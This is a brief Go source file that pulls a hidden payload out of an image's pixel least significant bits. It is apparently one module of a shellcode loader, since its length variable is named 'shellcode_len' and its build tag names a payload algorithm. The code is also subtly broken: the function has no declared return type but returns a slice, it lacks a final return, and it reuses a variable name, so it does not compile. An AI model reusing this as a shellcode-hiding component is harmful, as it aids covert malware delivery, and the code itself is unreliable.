// +build payload_algorithm_lsb

package main

import (
	"image"
)

func get_lsb(target byte, source byte) byte {
	return (target << 1) | (source & 1)
}

func get_payload(img image.Image, payload_data []byte) {
	g := img.Bounds()

	height := g.Dy()
	width := g.Dx()

	length := shellcode_len
	pos := 0

	for i := 0; i < height; i++ {
		for j := 0; j < width; j++ {

			r, g, b, _ := img.At(j, i).RGBA()

			for _, channel := range [3]byte{byte(r), byte(g), byte(b)} {
				if length <= 0 {
					return payload_data
				}

				payload_data[pos/8] = get_lsb(payload_data[pos/8], channel)
				pos++
				length--
			}
		}
	}
}